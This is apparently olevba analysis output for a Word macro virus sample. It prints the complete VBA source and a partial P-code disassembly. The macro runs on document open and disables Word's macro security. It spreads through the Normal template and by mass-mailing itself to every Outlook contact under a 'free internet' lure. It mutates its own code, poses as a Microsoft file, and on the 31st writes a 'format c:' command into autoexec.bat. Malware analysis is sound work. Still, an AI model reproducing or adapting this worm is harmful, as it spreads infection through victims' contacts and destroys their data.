olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.es
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.es - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()

On Error Resume Next

With Dialogs(wdDialogFileSummaryInfo)

.Author = Chr(45) + Chr(61) + Chr(68) + Chr(97) + Chr(71) + Chr(111) + Chr(78) + Chr(61) + Chr(45)

.Title = Chr(66) + Chr(108) + Chr(65) + Chr(99) + Chr(75) + Chr(32) + Chr(68) + Chr(97) + Chr(89) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

.Subject = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(105) + Chr(115) + Chr(32) + Chr(97) + Chr(32) + Chr(66) + Chr(108) + Chr(97) + Chr(99) + Chr(107) + Chr(32) + Chr(68) + Chr(97) + Chr(121) + Chr(33)

.Comments = Chr(84) + Chr(104) + Chr(120) + Chr(32) + Chr(116) + Chr(111) + Chr(32) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(98) + Chr(114) + Chr(101) + Chr(97) + Chr(107) + Chr(101) + Chr(114) + Chr(115) + Chr(46)

.Keywords = Chr(32) + Chr(124) + Chr(32) + Chr(66) + Chr(108) + Chr(97) + Chr(99) + Chr(107) + Chr(32) + Chr(68) + Chr(97) + Chr(121) + Chr(32) + Chr(124) + Chr(32) + Chr(68) + Chr(97) + Chr(71) + Chr(111) + Chr(78) + Chr(32) + Chr(124) + Chr(32) + Chr(73) + Chr(116) + Chr(65) + Chr(108) + Chr(89) + Chr(32) + Chr(124) + Chr(32)

.Execute

End With

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then

CommandBars("Macro").Controls("Security...").Enabled = False

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

End If

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "" Then

CommandBars("Tools").Controls("Macro").Enabled = False

Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)

End If

CommandBars("tools").Controls("Customize...").Enabled = False

CommandBars("view").Controls("Toolbars").Enabled = False

CommandBars("view").Controls("Status Bar").Enabled = False

WordBasic.DisableAutoMacros 0

ActiveDocument.ReadOnlyRecommended = False

Application.ScreenUpdating = False

Application.DisplayStatusBar = False

Application.DisplayAlerts = False

UN92 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

MM84 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Application.EnableCancelKey = 0

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set IA14 = ActiveDocument.VBProject.VBComponents.Item(1)

BN71 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set IA14 = NormalTemplate.VBProject.VBComponents.Item(1)

MT5 = True

End If

If MT5 = True Then

ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\windows\Kernel32.sys"

IA14.CodeModule.AddFromFile ("c:\windows\Kernel32.sys")

IA14.CodeModule.deletelines 1, 4

IA14.CodeModule.replaceline 1, "Sub Document_Close()"

ElseIf BN71 = True Then

IA14.CodeModule.AddFromFile ("c:\windows\Kernel32.sys")

IA14.CodeModule.deletelines 1, 4

End If

whereits = ActiveDocument.FullName

ActiveDocument.SaveAs Environ("WINDIR") & "\free.doc"

DoEvents

ActiveDocument.SaveAs whereits

DoEvents

Set Black_OApp = CreateObject("Outlook.Application")

Set Black_Mapi = Black_OApp.GetNameSpace("MAPI")

For Each Black_AddList In Black_Mapi.AddressLists

If Black_AddList.AddressEntries.Count <> 0 Then

Black_Count = Black_AddList.AddressEntries.Count

For Black_AddListCount = 1 To Black_Count

Set Black_AddListEntry = Black_AddList.AddressEntries(Black_AddListCount)

Set Black_msg = Black_OApp.CreateItem(0)

Black_msg.To = Black_AddListEntry.Address

Black_msg.Subject = "Internet Now FREE, it's the future!!!"

Black_msg.Body = "No more money to surf, NOW it's Free..." + vbCrLf + "Read now, check this!"

Black_msg.Attachments.Add Environ("WINDIR") & "\free.doc"

Black_msg.DeleteAfterSubmit = True

If Black_msg.To <> "" Then

Black_msg.Send

DoEvents

End If

DoEvents

Next

End If

Next

If Day(Now) = 31 Then
    
SetAttr "c:\autoexec.bat", 0
   
Open "c:\autoexec.bat" For Append As #1

Print #1, "PATH=%PATH%;C:\DOS;C:\WINDOWS\COMMAND"

Print #1, "echo y | format c:/u/V:BLACKDAY >nul"

Close #1

End If

With IA14.CodeModule

For x = 2 To (IA14.CodeModule.CountOfLines - 14) Step 2

For y = 1 To (Int(Rnd * 10) + 2)

LC52 = LC52 + (Chr(65 + Int(Rnd * 20))) & (Chr(122 - Int(Rnd * 20))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 20))) & (Chr(122 - Int(Rnd * 20))) & " + "

Next y

.replaceline x, (Chr(65 + Int(Rnd * 20))) & " = " & LC52 & (Chr(65 + Int(Rnd * 20)))

LC52 = ""

Next x

End With

YAD_KCALB:

If MT5 = True Then

IA14.CodeModule.replaceline 213, "Sub ToolsMacro()"

IA14.CodeModule.replaceline 215, "End Sub"

IA14.CodeModule.replaceline 217, "Sub FileTemplates()"

IA14.CodeModule.replaceline 219, "End Sub"

IA14.CodeModule.replaceline 221, "Sub ViewVBCode()"

IA14.CodeModule.replaceline 223, "End Sub"

End If

If BN71 = True Then

IA14.CodeModule.replaceline 213, "' *****************************************************************"

IA14.CodeModule.replaceline 215, "' Created by Microsoft Product Support Services"

IA14.CodeModule.replaceline 217, "' Copyright (c) 2000 Microsoft Corp."

IA14.CodeModule.replaceline 219, "' Created June 30th, 2000: Don't CHANGE This File"

IA14.CodeModule.replaceline 221, "' Description : System Word File - Millenium Edition, All bug fixed"

IA14.CodeModule.replaceline 223, "' *****************************************************************"

End If

End Sub

' *****************************************************************

' Created by Microsoft Product Support Services

' Copyright (c) 2000 Microsoft Corp.

' Created June 30th, 2000: Don't CHANGE This File

' Description : System Word File - Millenium Edition, All bug fixed

' *****************************************************************



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.es
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11141 bytes
' Line #0:
' 	FuncDefn (Sub Document_Open())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #5:
' Line #6:
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0047 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	MemStWith Author 
' Line #7:
' Line #8:
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	MemStWith Title 
' Line #9:
' Line #10:
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	MemStWith Subject 
' Line #11:
' Line #12:
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	MemStWith Comments 
' Line #13:
' Line #14:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0047 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	MemStWith Keywords 
' Line #15:
' Line #16:
' 	ArgsMemCallWith Execute 0x0000 
' Line #17:
' Line #18:
' 	EndWith 
' Line #19:
' Line #20:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #21:
' Line #22:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #23:
' Line #24:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #25:
' Line #26:
' 	EndIfBlock 
' Line #27:
' Line #28:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #29:
' Line #30:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #31:
' Line #32:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #33:
' Line #34:
' 	EndIfBlock 
' Line #35:
' Line #36:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #37:
' Line #38:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #39:
' Line #40:
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Status Bar"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #41:
' Line #42:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #43:
' Line #44:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #45:
' Line #46:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #47:
' Line #48:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #49:
' Line #50:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #51:
' Line #52:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St UN92 
' Line #53:
' Line #54:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St MM84 
' Line #55:
' Line #56:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #57:
' Line #58:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #59:
' Line #60:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set IA14 
' Line #61:
' Line #62:
' 	LitVarSpecial (True)
' 	St BN71 
' Line #63:
' Line #64:
' 	EndIfBlock 
' Line #65:
' Line #66:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #67:
' Line #68:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set IA14 
' Line #69:
' Line #70:
' 	LitVarSpecial (True)
' 	St MT5 
' Line #71:
' Line #72:
' 	EndIfBlock 
' Line #73:
' Line #74:
' 	Ld MT5 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #75:
' Line #76:
' 	LitStr 0x0017 "c:\windows\Kernel32.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #77:
' Line #78:
' 	LitStr 0x0017 "c:\windows\Kernel32.sys"
' 	Paren 
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #79:
' Line #80:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #81:
' Line #82:
' 	LitDI2 0x0001 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #83:
' Line #84:
' 	Ld BN71 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #85:
' Line #86:
' 	LitStr 0x0017 "c:\windows\Kernel32.sys"
' 	Paren 
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #87:
' Line #88:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld IA14 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #89:
' Line #90:
' 	EndIfBlock 
' Line #91:
' Line #92:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St whereits 
' Line #93:
' Line #94:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0009 "\free.doc"
' 	Concat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #95:
' Line #96:
' 	ArgsCall DoEvents 0x0000 
' Line #97:
' Line #98:
' 	Ld whereits 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #99:
' Line #100:
' 	ArgsCall DoEvents 0x0000 
' Line #101:
' Line #102:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set Black_OApp 
' Line #103:
' Line #104:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld Black_OApp 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set Black_Mapi 
' Line #105:
' Line #106:
' 	StartForVariable 
' 	Ld Black_AddList 
' 	EndForVariable 
' 	Ld Black_Mapi 
' 	MemLd AddressLists 
' 	ForEach 
' Line #107:
' Line #108:
' 	Ld Black_AddList 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #109:
' Line #110:
' 	Ld Black_AddList 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St Black_Count 
' Line #111:
' Line #112:
' 	StartForVariable 
' 	Ld Black_AddListCount 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Black_Count 
' 	For 
' Line #113:
' Line #114:
' 	SetStmt 
' 	Ld Black_AddListCount 
' 	Ld Black_AddList 
' 	ArgsMemLd AddressEntries 0x0001 
' 	Set Black_AddListEntry 
' Line #115:
' Line #116:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld Black_OApp 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set Black_msg 
' Line #117:
' Line #118:
' 	Ld Black_AddListEntry 
' 	MemLd Address 
' 	Ld Black_msg 
' 	MemSt True 
' Line #119:
' Line #120:
' 	LitStr 0x0025 "Internet Now FREE, it's the future!!!"
' 	Ld Black_msg 
' 	MemSt Subject 
' Line #121:
' Line #122:
' 	LitStr 0x0027 "No more money to surf, NOW it's Free..."
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0015 "Read now, check this!"
' 	Add 
' 	Ld Black_msg 
' 	MemSt Body 
' Line #123:
' Line #124:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0009 "\free.doc"
' 	Concat 
' 	Ld Black_msg 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #125:
' Line #126:
' 	LitVarSpecial (True)
' 	Ld Black_msg 
' 	MemSt DeleteAfterSubmit 
' Line #127:
' Line #128:
' 	Ld Black_msg 
' 	MemLd True 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #129:
' Line #130:
' 	Ld Black_msg 
' 	ArgsMemCall Send 0x0000 
' Line #131:
' Line #132:
' 	ArgsCall DoEvents 0x0000 
' Line #133:
' Line #134:
' 	EndIfBlock 
' Line #135:
' Line #136:
' 	ArgsCall DoEvents 0x0000 
' Line #137:
' Line #138:
' 	StartForVariable 
' 	Next 
' Line #139:
' Line #140:
' 	EndIfBlock 
' Line #141:
' Line #142:
' 	StartForVariable 
' 	Next 
' Line #143:
' Line #144:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	IfBlock 
' Line #145:
' Line #146:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #147:
' Line #148:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #149:
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "PATH=%PATH%;C:\DOS;C:\WINDOWS\COMMAND"
' 	PrintItemNL 
' Line #151:
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "echo y | format c:/u/V:BLACKDAY >nul"
' 	PrintItemNL 
' Line #153:
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #155:
' Line #156:
' 	EndIfBlock 
' Line #157:
' Line #158:
' 	StartWithExpr 
' 	Ld IA14 
' 	MemLd CodeModule 
' 	With 
' Line #159:
' Line #160:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld IA14 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x000E 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #161:
' Line #162:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	For 
' Line #163:
' Line #164:
' 	Ld LC52 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Add 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	St LC52 
' Line #165:
' Line #166:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #167:
' Line #168:
' 	Ld x 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld LC52 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #169:
' Line #170:
' 	LitStr 0x0000 ""
' 	St LC52 
' Line #171:
' Line #172:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #173:
' Line #174:
' 	EndWith 
' Line #175:
' Line #176:
' 	Label YAD_KCALB 
' Line #177:
' Line #178:
' 	Ld MT5 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #179:
' Line #180:
' 	LitDI2 0x00D5 
' 	LitStr 0x0010 "Sub ToolsMacro()"
